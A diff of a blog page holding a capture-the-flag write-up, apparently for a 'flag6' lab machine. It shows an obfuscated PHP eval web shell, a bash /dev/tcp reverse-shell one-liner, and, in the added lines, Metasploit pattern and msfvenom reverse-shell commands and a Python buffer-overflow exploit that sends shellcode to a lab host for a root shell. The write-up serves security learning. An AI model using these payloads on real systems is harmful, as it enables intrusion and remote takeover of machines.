@@ -184,9 +184,6 @@ The script compares the user input from the <code>pass</code> field to the hardc
 &lt;?php $jtch=create_function(str_rot13('$').chr(01212-01027).chr(0330272/01746).chr(01272-01115).chr(564-463),str_rot13('r').str_rot13('i').str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(546-431).chr(0x136-0xc7).str_rot13('z').str_rot13('r').str_rot13(')').str_rot13(';'));$jtch(str_rot13('517475;@riNy($_CBFG[AYEorUlf]);1552425;'));?&gt;
 </code></pre>
 
-<p>$someeval($some);
-517475;@evAl($_POST[NLRbeHys]);1552425;</p>
-
 <p>got: <code>Error: Invalid filetype (php)</code>. Let&rsquo;s try to change to <code>jpg</code>, then, got: <code>Error: CrappyWAF detected malware. Signature: Base64_decode php function detected</code>.
 <code>eval</code> function also get banned.</p>
 
@@ -228,7 +225,7 @@ The script compares the user input from the <code>pass</code> field to the hardc
 
 <p>I think there might be something to dig, but I&rsquo;m so lazy and tired.</p>
 
-<p>bash -c &lsquo;bash -i &amp;&gt;/dev/tcp/192.168.1.<sup>68</sup>&frasl;<sub>9943</sub> 0&lt;&amp;1&rsquo;</p>
+<p>Get a reverse shell: <code>bash -c 'bash -i &amp;&gt;/dev/tcp/192.168.1.68/9943 0&lt;&amp;1'</code></p>
 
 <p>LinEnum first:</p>
 
@@ -360,13 +357,82 @@ puts(&quot;Invalid Agent ID &quot;Invalid Agent ID
 +++ exited (status 254) +++
 </code></pre>
 
-<p>MSF created 500 bytes:</p>
+<p>MSF created 500 bytes: <code>/opt/metasploit/tools/exploit/pattern_create.rb -l 500</code></p>
 
-<p>gdb and use <code>3</code> to submit to get an buffer overflow: 0x41366641</p>
+<p>gdb <code>r</code> and use <code>3</code> to submit to get an buffer overflow: 0x41366641 (EIP)</p>
 
-<p>Found the buffer overflow at offset 168.</p>
+<p><code>/opt/metasploit/tools/exploit/pattern_offset.rb -q 41366641 -l 500</code> Found the buffer overflow at offset 168.</p>
 
-<p>Now It&rsquo;s time to build the shellcode.</p>
+<p>Now It&rsquo;s time to build the shellcode, we have two methods here, first: ret2libc, second: ret2mycode.</p>
+
+<p>Due to <code>NO CANARY</code> and <code>NX Disabled</code>, we use method 2 here.</p>
+
+<p>Let&rsquo;s download this binary, and IDA-it.</p>
+
+<p>With our lovely <code>snowman</code> plugin, just press <code>F3</code> to decompile the function we need. You&rsquo;ll find all your input was pointed with EAX.</p>
+
+<p>Get back to <a href="http://ropshell.com/ropsearch?h=fabc1afd43f668df0b812213567d032c">ropshell</a> , you&rsquo;ll need to find a <code>call eax</code> at <code>0x08048563</code> to let program return back to the data we input.</p>
+
+<p>We use MSF here: <code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=29099 -f python -b &quot;\x00\x0a\x0d&quot;</code>  Generate a reverse shell in Python format and avoid null char or newline char.</p>
+
+<p>The payload should be generated in this way:</p>
+
+<pre><code>+======================+==========+
+|        Content       |  Length  |
++======================+==========+
+| \x90 (which mean nop)| 73 Bytes |
+|    PAYLOAD SHELL     | 95 Bytes | 
+|     RETURN ADDR      | 04 Bytes |
++======================+==========+
+</code></pre>
+
+<p>Just write a Python to help us:</p>
+
+<pre><code class="language-python3">#!/usr/bin/env python3
+
+import socket
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((&quot;172.16.51.134&quot;, 7788))
+client.recv(512)
+client.sendall(b&quot;48093572\n&quot;)
+client.recv(512)
+client.sendall(b&quot;3\n&quot;)
+client.recv(512)
+
+# shellcode from msfvenom
+buf = b&quot;&quot;
+buf += b&quot;\xd9\xcd\xd9\x74\x24\xf4\xbe\x1d\xe3\x01\xd6\x5a\x29&quot;
+buf += b&quot;\xc9\xb1\x12\x31\x72\x17\x83\xea\xfc\x03\x6f\xf0\xe3&quot;
+buf += b&quot;\x23\xbe\x2d\x14\x28\x93\x92\x88\xc5\x11\x9c\xce\xaa&quot;
+buf += b&quot;\x73\x53\x90\x58\x22\xdb\xae\x93\x54\x52\xa8\xd2\x3c&quot;
+buf += b&quot;\xa5\xe2\x24\x8e\x4d\xf1\x26\x9f\x26\x7c\xc7\xef\x5f&quot;
+buf += b&quot;\x2f\x59\x5c\x13\xcc\xd0\x83\x9e\x53\xb0\x2b\x4f\x7b&quot;
+buf += b&quot;\x46\xc3\xe7\xac\x87\x71\x91\x3b\x34\x27\x32\xb5\x5a&quot;
+buf += b&quot;\x77\xbf\x08\x1c&quot;
+
+# padding
+buf += b&quot;A&quot; * (168 - len(buf))
+
+# call eax gadget
+buf += b&quot;\x63\x85\x04\x08\n&quot;
+
+client.sendall(buf)
+client.close()
+</code></pre>
+
+<p>Then you have the root shell, the flag is under <code>/root/flag.txt</code>: flag6{R2gwc3RQcm90MGMwbHM=}</p>
+
+<p>Decode again: Gh0stProt0c0ls</p>
+
+<h1 id="reference">Reference</h1>
+
+<ul>
+<li><a href="http://ropshell.com">http://ropshell.com</a></li>
+<li><a href="https://stackoverflow.com/questions/12167911/python-socket-send-ascii-command-and-receive-response">https://stackoverflow.com/questions/12167911/python-socket-send-ascii-command-and-receive-response</a></li>
+</ul>
+
+<p>(END)</p>
 
       </article>
       <div id="disqus_thread"></div>
